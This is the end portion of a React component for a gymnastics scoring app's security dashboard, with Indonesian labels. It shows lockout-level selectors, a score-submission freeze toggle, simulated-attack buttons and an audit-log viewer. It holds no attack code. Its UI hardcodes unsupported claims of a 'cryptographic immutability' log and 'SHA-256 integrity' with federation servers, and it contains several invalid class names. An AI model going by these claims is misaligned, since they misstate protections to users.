                      className={`w-full text-left p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between ${
                        isCurrent
                          ? 'bg-indigo-50 border-indigo-300 text-indigo-950 font-bold ring-1 ring-indigo-505/20'
                          : 'bg-slate-50 hover:bg-slate-100/50 border-slate-200 text-slate-700'
                      }`}
                    >
                      <div>
                        <div className="font-mono text-xs font-black uppercase flex items-center gap-1.5">
                          {isCurrent && <span className="w-2 h-2 rounded-full bg-indigo-600 animate-pulse"></span>}
                          {p.levelName}
                        </div>
                        <div className="text-3xs text-slate-500 mt-0.5 leading-normal font-medium">
                          Batas: {p.maxAttempts} percobaan / Durasi Lockout: {p.lockoutDuration}s
                        </div>
                      </div>
                      <span className={`text-[10px] font-mono font-black ${isCurrent ? 'text-indigo-700' : 'text-slate-450'}`}>
                        {key === 'paranoia' ? '⚠️ EXTREME' : key === 'strict' ? '🔴 HIGH' : key === 'standard' ? '🔵 MED' : '🟢 LOW'}
                      </span>
                    </button>
                  );
                })}
              </div>
            </div>

            {/* DARURAT LOCKDOWN SYSTEM SCORING */}
            <div className={`border p-5 sm:p-6 rounded-2xl shadow-sm space-y-4 transition-all duration-300 ${
              globalLock 
                ? 'bg-rose-950 text-white border-rose-800' 
                : 'bg-white border-slate-205 border-slate-200 text-slate-800'
            }`}>
              <div className="flex items-center gap-2">
                <Shield className={`w-5 h-5 shrink-0 ${globalLock ? 'text-rose-400' : 'text-indigo-605'}`} />
                <h4 className="font-display font-black text-xs uppercase tracking-wider block">
                  Scoring Submission Freeze Key
                </h4>
              </div>

              <p className={`text-2xs font-semibold leading-relaxed ${globalLock ? 'text-rose-200' : 'text-slate-500'}`}>
                Berguna untuk membekukan sirkuit input wasit dalam satu ketukan jika terjadi dugaan siber anomalitas, perselisihan skor (dispute juri), atau gangguan teknis arena.
              </p>

              <div className="flex items-center justify-between gap-3 pt-1">
                <div className="font-mono text-[10px] font-bold">
                  Skor Masuk: {globalLock ? <span className="text-rose-400 font-extrabold animate-pulse">🔴 LOCKED</span> : <span className="text-emerald-600 font-bold">🟢 OPEN</span>}
                </div>
                
                <button
                  type="button"
                  onClick={handleToggleGlobalLock}
                  className={`px-4 py-2 font-mono text-3xs font-black tracking-widest rounded-xl transition-all uppercase cursor-pointer border-none shadow-xs ${
                    globalLock 
                      ? 'bg-white text-rose-955 hover:bg-rose-50' 
                      : 'bg-slate-900 text-white hover:bg-slate-800'
                  }`}
                >
                  {globalLock ? '🔓 RELEASE LOCK' : '🔒 FREEZE SIRKUIT'}
                </button>
              </div>
            </div>

            {/* CYBER ATTACK PENETRATION SANDBOX */}
            <div className="bg-slate-950 text-slate-100 border border-slate-850 rounded-2xl p-5 sm:p-6 shadow-sm space-y-4">
              <div className="flex items-center gap-2 text-rose-500">
                <Skull className="w-5 h-5 text-rose-500 shrink-0" />
                <h4 className="font-display font-black text-xs uppercase tracking-wider">
                  Test-Bed: Cyber Intrusion Simulator
                </h4>
              </div>

              <p className="text-[10px] leading-relaxed text-slate-400 font-mono">
                Ketuk tombol simulasi di bawah ini untuk menguji bagaimana sistem keamanan GymnaScore memetakan, mendeteksi, mencegah, dan mengaudit serangan peretasan secara real-time.
              </p>

              <div className="grid grid-cols-3 gap-2 pt-1 font-mono text-[9px] font-black tracking-wide text-center">
                <button
                  onClick={() => handleSimulatePenTest('SQLi')}
                  className="p-2 py-2.5 rounded-xl border border-slate-800 hover:border-slate-700 hover:bg-white/5 text-rose-400 cursor-pointer text-3xs transition-all uppercase"
                >
                  💉 SQL Injection
                </button>
                <button
                  onClick={() => handleSimulatePenTest('XSS')}
                  className="p-2 py-2.5 rounded-xl border border-slate-800 hover:border-slate-700 hover:bg-white/5 text-rose-400 cursor-pointer text-3xs transition-all uppercase"
                >
                  ⚡ XSS Script
                </button>
                <button
                  onClick={() => handleSimulatePenTest('Brute')}
                  className="p-2 py-2.5 rounded-xl border border-slate-800 hover:border-slate-700 hover:bg-white/5 text-rose-400 cursor-pointer text-3xs transition-all uppercase"
                >
                  ⚔️ Brute Scraper
                </button>
              </div>
            </div>

          </div>

          {/* REALTIME AUDIT LOG TERMINAL */}
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-5 sm:p-6 shadow-lg space-y-5 flex flex-col h-full min-h-[500px]">
              
              {/* Terminal top header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-slate-800 pb-4 gap-3">
                <div className="flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-indigo-400" />
                  <div>
                    <h3 className="font-mono font-black text-xs sm:text-sm text-slate-100 uppercase flex items-center gap-2">
                      SIBER AUDIT LOG CONSOLE
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                    </h3>
                    <p className="text-[9px] text-slate-500 font-mono">Cryptographic immutability trail ledger (Last 150 events)</p>
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={handleClearAuditLogs}
                    className="text-rose-400 hover:text-rose-350 border border-slate-800 hover:border-slate-700 bg-transparent px-3 py-1.5 rounded-xl transition-all cursor-pointer font-mono text-[9px] font-bold"
                  >
                    Kosongkan Log
                  </button>
                </div>
              </div>

              {/* Logs Search & Filter criteria */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="sm:col-span-1">
                  <div className="relative">
                    <input
                      type="text"
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                      placeholder="Cari kata kunci..."
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl py-2 pl-8 pr-3 text-[10px] font-mono text-slate-200 focus:outline-none focus:border-indigo-500 transition-all"
                    />
                    <Search className="w-3.5 h-3.5 text-slate-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
                  </div>
                </div>

                <div className="sm:col-span-2 flex justify-end gap-1.5">
                  {[
                    { id: 'ALL', label: 'Semu' },
                    { id: 'FAILURES', label: '🛑 Serangan / Failed' },
                    { id: 'ADMIN', label: '🛠️ Admin Akses' }
                  ].map(btn => (
                    <button
                      key={btn.id}
                      onClick={() => setLogFilter(btn.id)}
                      className={`px-3 py-1.5 rounded-xl font-mono text-[9px] font-bold cursor-pointer transition-all ${
                        logFilter === btn.id
                          ? 'bg-indigo-600 text-white border-none'
                          : 'bg-slate-950 text-slate-400 border border-slate-800 hover:bg-slate-800'
                      }`}
                    >
                      {btn.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Console log list scrollable box */}
              <div className="bg-slate-955 bg-slate-950 border border-slate-850 p-4 rounded-2xl flex-1 overflow-y-auto max-h-[420px] font-mono space-y-2.5 text-2xs md:text-xs">
                {filteredLogs.length === 0 ? (
                  <div className="h-44 flex flex-col items-center justify-center text-slate-500 gap-2">
                    <ShieldCheck className="w-8 h-8 text-slate-600" />
                    <span className="text-[10px]">No security incident logged matching query...</span>
                  </div>
                ) : (
                  filteredLogs.map(log => {
                    // Decide color scheme based on event type
                    const isFailure = log.eventType === 'LOGIN_FAILED' || log.eventType === 'LOCKOUT' || log.eventType === 'CYBER_ATTACK_SIMULATION';
                    const isActionSuccess = log.eventType === 'LOGIN_SUCCESS' || log.eventType === 'UNLOCKED';

                    return (
                      <div 
                        key={log.id} 
                        className={`p-3 rounded-xl border border-slate-800/60 leading-normal flex items-start justify-between gap-3 animate-fadeIn ${
                          isFailure 
                            ? 'bg-rose-950/20 border-rose-900/30' 
                            : isActionSuccess 
                              ? 'bg-emerald-950/20 border-emerald-900/30' 
                              : 'bg-slate-900/40 border-slate-800/40'
                        }`}
                      >
                        <div className="space-y-1.5">
                          <div className="flex flex-wrap items-center gap-1.5">
                            <span className={`text-[8px] px-1.5 py-0.5 rounded font-black tracking-wider text-white uppercase ${
                              log.eventType === 'CYBER_ATTACK_SIMULATION' ? 'bg-red-650 bg-red-600' :
                              log.eventType === 'LOCKOUT' ? 'bg-rose-700' :
                              log.eventType === 'LOGIN_FAILED' ? 'bg-rose-600' :
                              log.eventType === 'LOGIN_SUCCESS' ? 'bg-emerald-600' :
                              log.eventType === 'UNLOCKED' ? 'bg-cyan-600' :
                              'bg-indigo-650 bg-indigo-600'
                            }`}>
                              [{log.eventType}]
                            </span>
                            <span className="text-slate-450 text-[9px] font-bold">
                              User: <span className="text-indigo-400">@{log.username}</span>
                            </span>
                            <span className="text-slate-500 text-[9px]">
                              ● IP: {log.ipAddress}
                            </span>
                          </div>

                          <p className="text-slate-300 font-medium leading-relaxed leading-snug">
                            {log.details}
                          </p>

                          <div className="text-[10px] text-slate-450 text-slate-500">
                            {new Date(log.timestamp).toLocaleString('id-ID')}
                          </div>
                        </div>

                        <span className={`text-[8px] font-mono font-black border uppercase px-1.5 py-0.5 rounded shrink-0 ${
                          log.action === 'ALLOWED' ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' :
                          log.action === 'BLOCKED' || log.action === 'FORCE_BLOCKED' ? 'bg-rose-500/10 border-rose-500/30 text-rose-450' :
                          log.action === 'SANITIZED' ? 'bg-amber-500/10 border-amber-500/30 text-amber-400' :
                          'bg-indigo-500/15 border-indigo-400/30 text-indigo-300'
                        }`}>
                          {log.action}
                        </span>
                      </div>
                    );
                  })
                )}
              </div>

              {/* Status bar */}
              <div className="flex flex-col sm:flex-row bg-slate-950 p-3 rounded-2xl border border-slate-800 items-center justify-between text-[9px] font-mono font-bold text-slate-550 text-slate-400 gap-2">
                <span className="flex items-center gap-1.5 shrink-0 uppercase tracking-widest text-slate-500">
                  <Activity className="w-3.5 h-3.5 text-indigo-450 text-indigo-400 animate-pulse" /> Security Pulse: Online
                </span>
                <span className="text-right text-[8px] text-slate-500 uppercase leading-snug text-center sm:text-right">
                  SHA-256 digested integrity matches with PERSANI / FIG secure server endpoints.
                </span>
              </div>

            </div>
          </div>

        </div>
      )}

    </div>
  );
}
